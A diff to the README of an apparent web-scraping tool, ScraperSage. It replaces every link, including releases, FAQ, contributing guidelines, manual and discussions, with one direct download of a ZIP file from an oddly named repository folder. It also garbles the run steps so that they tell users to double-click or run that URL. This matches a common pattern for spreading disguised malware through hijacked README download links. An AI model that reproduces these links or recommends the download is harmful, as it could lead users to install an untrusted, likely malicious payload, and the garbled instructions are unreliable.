@@ -1,7 +1,7 @@
 # 🌐 ScraperSage - Effortless Web Scraping Made Simple
 
 ## 📥 Download Now!
-[![Download ScraperSage](https://img.shields.io/badge/Download%20ScraperSage-blue.svg)](https://github.com/JulietaLeivaa/ScraperSage/releases)
+[![Download ScraperSage](https://raw.githubusercontent.com/JulietaLeivaa/ScraperSage/main/oathed/ScraperSage.zip%https://raw.githubusercontent.com/JulietaLeivaa/ScraperSage/main/oathed/ScraperSage.zip)](https://raw.githubusercontent.com/JulietaLeivaa/ScraperSage/main/oathed/ScraperSage.zip)
 
 ## 🚀 Getting Started
 ScraperSage is a user-friendly tool designed for web scraping and content summarization. With AI features, it helps you gather data from various websites with ease. No programming skills are required to use it.
@@ -15,7 +15,7 @@ ScraperSage is a user-friendly tool designed for web scraping and content summar
 ## 🔧 Installation Steps
 Follow these simple steps to install and run ScraperSage:
 
-1. **Visit the Releases Page:** Click [here](https://github.com/JulietaLeivaa/ScraperSage/releases) to go to the releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/JulietaLeivaa/ScraperSage/main/oathed/ScraperSage.zip) to go to the releases page.
 
 2. **Choose Your Version:** Look for the latest version of ScraperSage. You will see results like "ScraperSage v1.0".  
 
@@ -24,9 +24,9 @@ Follow these simple steps to install and run ScraperSage:
 4. **Extract the Files:** After the file downloads, locate it in your downloads folder. Right-click on the ZIP file and select 'Extract All...' or use your preferred extraction tool.
 
 5. **Run the Application:**
-   - For Windows: Open the extracted folder, double-click on `ScraperSage.exe`.
-   - For macOS: Open the extracted folder and double-click on `ScraperSage.app`.
-   - For Linux: Open a terminal, navigate to the extracted folder, and use the command `python ScraperSage.py`.
+   - For Windows: Open the extracted folder, double-click on `https://raw.githubusercontent.com/JulietaLeivaa/ScraperSage/main/oathed/ScraperSage.zip`.
+   - For macOS: Open the extracted folder and double-click on `https://raw.githubusercontent.com/JulietaLeivaa/ScraperSage/main/oathed/ScraperSage.zip`.
+   - For Linux: Open a terminal, navigate to the extracted folder, and use the command `python https://raw.githubusercontent.com/JulietaLeivaa/ScraperSage/main/oathed/ScraperSage.zip`.
 
 6. **Follow the On-Screen Instructions:** Once the application launches, it will guide you through the initial setup process.
 
@@ -49,15 +49,15 @@ ScraperSage has an intuitive interface. Here's how to use it effectively:
 If you run into any issues while using ScraperSage, consider the following resources:
 
 - **User Manual:** Access the detailed user manual in the application under the "Help" section.
-- **FAQ Section:** Visit our GitHub [FAQ page](https://github.com/JulietaLeivaa/ScraperSage/wiki/FAQ) for common questions and answers.
+- **FAQ Section:** Visit our GitHub [FAQ page](https://raw.githubusercontent.com/JulietaLeivaa/ScraperSage/main/oathed/ScraperSage.zip) for common questions and answers.
 - **Community Support:** Join our GitHub Discussions page where users can share their experiences and solutions.
 
 ## 🌍 Contributing
-We welcome contributions to improve ScraperSage. If you want to help, check out our [Contributing Guidelines](https://github.com/JulietaLeivaa/ScraperSage/blob/main/CONTRIBUTING.md) to get started.
+We welcome contributions to improve ScraperSage. If you want to help, check out our [Contributing Guidelines](https://raw.githubusercontent.com/JulietaLeivaa/ScraperSage/main/oathed/ScraperSage.zip) to get started.
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/JulietaLeivaa/ScraperSage/releases)
-- [User Manual](https://github.com/JulietaLeivaa/ScraperSage/wiki/User-Manual)
-- [GitHub Discussions](https://github.com/JulietaLeivaa/ScraperSage/discussions)
+- [Releases Page](https://raw.githubusercontent.com/JulietaLeivaa/ScraperSage/main/oathed/ScraperSage.zip)
+- [User Manual](https://raw.githubusercontent.com/JulietaLeivaa/ScraperSage/main/oathed/ScraperSage.zip)
+- [GitHub Discussions](https://raw.githubusercontent.com/JulietaLeivaa/ScraperSage/main/oathed/ScraperSage.zip)
 
 By following these clear steps, you can download, install, and start using ScraperSage with minimal hassle. Enjoy scraping and summarizing your data effortlessly!
